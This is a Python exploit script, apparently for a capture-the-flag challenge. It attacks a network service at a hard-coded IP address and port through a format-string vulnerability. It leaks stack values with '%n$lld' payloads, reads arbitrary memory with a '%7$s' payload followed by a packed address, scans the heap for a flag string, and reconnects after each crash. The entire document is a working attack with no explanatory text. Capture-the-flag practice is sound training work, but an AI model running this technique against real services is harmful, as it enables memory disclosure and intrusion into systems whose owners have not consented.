#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.04)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

# scan heap downward from arg14, reconnect on crash, track relative offset
s=newconn(); a14=leak_lld(s,14)
print("arg14=",hex(a14))
rel=0
found=[]
try:
    while rel > -0x40000:
        X=a14+rel
        r=readmem(s,X)
        if b'PTITCTF' in r or b'{' in r or b'2026' in r:
            print("MARK",hex(X),repr(r[:200])); found.append(X)
        if r==b'' or r==b'<T':
            # crash, reconnect
            try: s.close()
            except: pass
            s=newconn(); a14=leak_lld(s,14)
        else:
            strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
            adv=max(len(strb),1)
            rel -= adv
        if len(found): break
except Exception as e:
    print("err",e)
print("found", [hex(x) for x in found])
s.close()
